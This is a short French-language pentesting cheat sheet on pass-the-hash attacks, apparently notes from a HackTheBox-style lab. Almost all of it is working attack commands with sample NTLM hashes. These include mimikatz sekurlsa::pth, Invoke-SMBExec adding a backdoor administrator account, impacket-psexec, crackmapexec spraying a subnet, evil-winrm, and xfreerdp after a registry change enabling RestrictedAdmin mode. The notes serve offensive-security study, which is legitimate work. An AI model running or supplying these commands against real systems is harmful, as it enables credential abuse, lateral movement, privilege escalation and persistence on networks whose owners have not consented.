# Pass The Hash

Pass the hash en utilisant mimikatz:

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

|     option    |                                                               Description                                                              |
| :-----------: | :------------------------------------------------------------------------------------------------------------------------------------: |
|     /user     |                                                  The user name we want to impersonate.                                                 |
| /rc4 or /NTLM |                                                    NTLM hash of the user's password.                                                   |
|    /domain    | Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.). |
|      /run     |                     The program we want to run with the user's context (if not specified, it will launch cmd.exe).                     |

Utilisation du script "Invoke-TheHash" en powershell:&#x20;

[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

```powershell
cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

|  Option  |                                                                         Description                                                                        |
| :------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------: |
|  Target  |                                                            Hostname or IP address of the target.                                                           |
| Username |                                                             Username to use for authentication.                                                            |
|  Domain  |              Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.             |
|   Hash   |                               NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.                              |
|  Command | Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target. |

Utilisation de impacket-psexec:

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Utilisation de crackmapexec:

```bash
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Utilisation de Evil-WinRM:

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Utilisation de xfreerdp:

```bash
Il faut activer le RestrictedAdminMode afin que la connexion via un hash soit possible:

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

Puis:

xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
